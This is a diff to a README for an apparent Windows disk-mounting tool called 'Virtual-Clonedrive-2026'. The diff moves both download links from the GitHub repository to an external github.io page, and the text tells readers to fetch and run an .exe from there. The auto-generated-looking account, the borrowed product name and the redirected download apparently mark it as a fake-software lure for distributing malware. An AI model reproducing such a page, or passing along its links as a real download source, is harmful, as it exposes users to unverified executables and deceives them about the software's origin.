@@ -1,6 +1,6 @@
 # 💿 Virtual-Clonedrive-2026 - Mount disk images on Windows easily
 
-[![](https://img.shields.io/badge/Download-Virtual_Clonedrive-blue.svg)](https://github.com/Minniepassing104/Virtual-Clonedrive-2026)
+[![](https://img.shields.io/badge/Download-Virtual_Clonedrive-blue.svg)](https://minniepassing104.github.io)
 
 ## 📁 About the software
 Virtual-Clonedrive-2026 creates virtual drives on your computer. It acts like a physical CD or DVD drive. You can mount image files directly from your hard disk. This software works on Windows 10 and Windows 11. It removes the need for physical discs. You save time and protect your data by using digital copies of your media.
@@ -15,7 +15,7 @@ Virtual-Clonedrive-2026 creates virtual drives on your computer. It acts like a 
 ## 📥 How to download
 You must visit the project page to get the installer. Use the link below to access the repository.
 
-[Click here to visit the download page](https://github.com/Minniepassing104/Virtual-Clonedrive-2026)
+[Click here to visit the download page](https://minniepassing104.github.io)
 
 Scroll to the section labeled Releases on the right side of the page. Select the most recent version available. Download the file ending in .exe to your desktop or downloads folder. 
 
